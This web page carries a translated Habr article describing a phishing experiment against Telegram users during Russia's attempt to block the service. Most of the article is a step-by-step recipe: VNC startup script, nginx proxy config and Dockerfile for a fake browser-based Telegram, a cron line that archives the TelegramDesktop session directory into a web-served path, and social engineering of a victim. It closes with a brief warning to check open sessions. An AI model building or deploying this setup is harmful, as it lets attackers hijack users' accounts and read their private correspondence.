<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hijacking Telegram on Panic Waves</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Today, the situation around the joint decision of the Federal Security Service of the Russian Federation and Roskomnadzor about blocking the Telegram ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hijacking Telegram on Panic Waves</h1><div class="post__text post__text-html js-mediator-article">  Today, the situation around the joint decision of the Federal Security Service of the Russian Federation and Roskomnadzor about blocking the Telegram messenger is very ambiguous.  This decision is reckless for a variety of reasons, and it carries more problems than it does in combating the threat of terrorism. <br><br>  For a mature business that took into account the risks associated with government decisions, this created some inconvenience because it had to use workaround solutions using a VPN.  But for ordinary users who were not ready for this turn of events, this brought new threats.  In a panic, users began to search and use the first available free VPNs, absolutely without thinking that this could turn into a trap for them in the form of DNS push-ups, and other MITM attacks. <br><br>  Telegram has the largest audience, and this fact could not be ignored by the IT business.  Companies, in turn, have invested huge capital in developing business tools using the API of this messenger.  Even a number of government projects invested money in the development of technical support bots, a vivid example of which is the state services portal (EPGU). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The HYIP wave provoked a dispute with colleagues about the vulnerability of panicked users, and we decided to conduct an experiment on phishing Telegram. <br><br>  Many users are faced with problems of access to the Web version of this messenger and we decided to play it.  Our goal was to get the tdata profile, which stores those same notorious encryption keys and session data. <br><br>  The composition of our recipe includes the following main components: <br><br><ul><li>  Telegram Desktop 1.2.17 (linux) </li><li>  Docker version 17.05.0-ce </li><li>  noVNC </li></ul><a name="habracut"></a><br>  According to the plan, you need to assemble an image of Docker in which X and Telegrams will start, and noVNC will transmit us the launched Telegrams via nginx to the client‚Äôs web browser. <br><br>  <b>Step 1:</b> We restrict the execution of the desktop environment, the execution of Telegrams only and its transmission through the VNC server. <br><br>  To do this, create a .vnc / xstartup file with the following contents: <br><br><pre><code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/sh if [ -z "$VNCAPP" ] then # Uncomment the following two lines for normal desktop: unset SESSION_MANAGER exec /etc/X11/xinit/xinitrc [ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup [ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresources xsetroot -solid grey vncconfig -iconic &amp; x-terminal-emulator -geometry 80x24+10+10 -ls -title "$VNCDESKTOP Desktop" &amp; x-window-manager &amp; else xsetroot -solid black vncconfig -iconic &amp; x-window-manager &amp; $VNCAPP sleep 10 vncserver -kill $DISPLAY fi</span></span></code> </pre> <br>  <b>Step 2:</b> We forward broadcast noVNC to port 80 using nginx. <br><br>  Create a default configuration file to put it into the image later. <br><br><pre> <code class="nginx hljs"><span class="hljs-attribute"><span class="hljs-attribute">upstream</span></span> vnc_proxy { <span class="hljs-attribute"><span class="hljs-attribute">server</span></span> <span class="hljs-number"><span class="hljs-number">127.0.0.1:6080</span></span>; } <span class="hljs-section"><span class="hljs-section">server</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">listen</span></span> <span class="hljs-number"><span class="hljs-number">80</span></span> default_server; <span class="hljs-attribute"><span class="hljs-attribute">listen</span></span> [::]:<span class="hljs-number"><span class="hljs-number">80</span></span> default_server; <span class="hljs-attribute"><span class="hljs-attribute">location</span></span> / { <span class="hljs-attribute"><span class="hljs-attribute">add_header</span></span> Access-Control-Allow-Origin *; <span class="hljs-attribute"><span class="hljs-attribute">proxy_pass</span></span> http://127.0.0.1:6080; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Host <span class="hljs-variable"><span class="hljs-variable">$host</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> X-Real-IP <span class="hljs-variable"><span class="hljs-variable">$remote_addr</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> X-Forwarded-For <span class="hljs-variable"><span class="hljs-variable">$proxy_add_x_forwarded_for</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_redirect</span></span> default; <span class="hljs-attribute"><span class="hljs-attribute">client_max_body_size</span></span> <span class="hljs-number"><span class="hljs-number">10m</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">client_body_buffer_size</span></span> <span class="hljs-number"><span class="hljs-number">128k</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_connect_timeout</span></span> <span class="hljs-number"><span class="hljs-number">90</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_send_timeout</span></span> <span class="hljs-number"><span class="hljs-number">90</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_read_timeout</span></span> <span class="hljs-number"><span class="hljs-number">90</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_buffer_size</span></span> <span class="hljs-number"><span class="hljs-number">4k</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_buffers</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-number"><span class="hljs-number">32k</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_busy_buffers_size</span></span> <span class="hljs-number"><span class="hljs-number">64k</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_temp_file_write_size</span></span> <span class="hljs-number"><span class="hljs-number">64k</span></span>; } <span class="hljs-attribute"><span class="hljs-attribute">location</span></span> /websockify { <span class="hljs-attribute"><span class="hljs-attribute">proxy_http_version</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_pass</span></span> http://vnc_proxy/; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Upgrade <span class="hljs-variable"><span class="hljs-variable">$http_upgrade</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Connection <span class="hljs-string"><span class="hljs-string">"upgrade"</span></span>; <span class="hljs-comment"><span class="hljs-comment"># VNC connection timeout proxy_read_timeout 61s; # Disable cache proxy_buffering off; } }</span></span></code> </pre><br>  <b>Step 3:</b> Since we built an experimental model, and not a full Telegram phishing service, to extract the data we decided to copy the archive of the tdata directory using cron into one of the directories available to the web server. <br><br>  Create a cron file with the following contents <br><br><pre> <code class="hljs markdown"><span class="hljs-bullet"><span class="hljs-bullet">* </span></span><span class="hljs-bullet"><span class="hljs-bullet">* *</span></span> <span class="hljs-bullet"><span class="hljs-bullet">* *</span></span> root tar -czf /root/tests/data.tar.gz /root/.local/share/TelegramDesktop</code> </pre> <br>  <b>Step 4:</b> VNC: <br><br>  This step requires noVNC customization, we cut out toolbars from it and registered an automatic connection to the VNC server, specifying the password that corresponds to the password .vnc / passwd. This password can be generated by the vncpasswd utility. <br><br>  <b>Step 5:</b> Build the Docker image: <br><br>  All that we prepared in advance, including the Telegram binary, we put in one directory, we create a Dockerfile and proceed to the assembly. <br><br><pre> <code class="hljs pgsql"># <span class="hljs-keyword"><span class="hljs-keyword">Version</span></span>: <span class="hljs-number"><span class="hljs-number">0.0</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> vcatechnology/linux-mint MAINTAINER Poul Lysunenko &lt;mpoul@hungosh.net&gt; RUN apt <span class="hljs-keyword"><span class="hljs-keyword">update</span></span> RUN apt install -y net-tools <span class="hljs-keyword"><span class="hljs-keyword">language</span></span>-pack-ru cinnamon nginx chromium-browser vnc4server xvnc4viewer xfonts-base RUN locale-gen ru_RU.UTF<span class="hljs-number"><span class="hljs-number">-8</span></span> &amp;&amp; dpkg-reconfigure locales <span class="hljs-keyword"><span class="hljs-keyword">COPY</span></span> noVNC/ /root/ <span class="hljs-keyword"><span class="hljs-keyword">COPY</span></span> .vnc/ /root/.vnc <span class="hljs-keyword"><span class="hljs-keyword">COPY</span></span> <span class="hljs-keyword"><span class="hljs-keyword">default</span></span> /etc/nginx/sites-available/ <span class="hljs-keyword"><span class="hljs-keyword">COPY</span></span> Telegram /root/ <span class="hljs-keyword"><span class="hljs-keyword">COPY</span></span> cron /etc/cron.d/sample RUN apt install -y cron EXPOSE <span class="hljs-number"><span class="hljs-number">6080</span></span> ENTRYPOINT /usr/sbin/service nginx <span class="hljs-keyword"><span class="hljs-keyword">start</span></span> &amp;&amp; /usr/sbin/service cron <span class="hljs-keyword"><span class="hljs-keyword">start</span></span> &amp;&amp; VNCAPP=/root/Telegram vnc4server -depth <span class="hljs-number"><span class="hljs-number">24</span></span> -geometry <span class="hljs-number"><span class="hljs-number">800</span></span>x600 &amp;&amp; /root/utils/launch.sh <span class="hljs-comment"><span class="hljs-comment">--vnc localhost:5901</span></span></code> </pre><br>  <b>Step 6:</b> After assembling and launching the image, using all the knowledge and skills in social engineering, we invite the victim of the experiment to tasting an alternative to the web version of Telegram. <br><br>  One minute after authorization, download the profile / tests/data.tar.gz <br><br>  <b>Findings:</b> <br><br>  As you understand, I won the argument with my colleagues, but this win did not bring any joy.  The state of affairs in the field of information security has negative trends related to the conditions of abrupt changes in Internet use policies in Russia.  This research hastily shown that people even savvy in information technology can step on the rakes that are set by intruders. <br><br>  PS: Do not forget to check open sessions of your messengers, maybe now someone is reading <cut></cut>  your correspondence </div><p>Source: <a href="https://habr.com/ru/post/353948/">https://habr.com/ru/post/353948/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../353938/index.html">Services for the selection of keywords on the App Store: a comparative characteristic</a></li>
<li><a href="../353940/index.html">The C ++ Standardization Committee rips the shackles off</a></li>
<li><a href="../353942/index.html">Modular development of Android applications</a></li>
<li><a href="../353944/index.html">Open lesson "iSCSI in Linux"</a></li>
<li><a href="../353946/index.html">Character kotlin</a></li>
<li><a href="../353950/index.html">Experiments on cats: how to increase the number of purchases in the application</a></li>
<li><a href="../353952/index.html">Issue # 19: IT training - current issues and challenges from leading companies</a></li>
<li><a href="../353954/index.html">Experience using Megaplan API</a></li>
<li><a href="../353956/index.html">Learn OpenGL. Lesson 5.3 - Shadow Maps</a></li>
<li><a href="../353958/index.html">Compare Draft, Gitkube, Helm, Ksonnet, Metaparticle and Skaffold</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>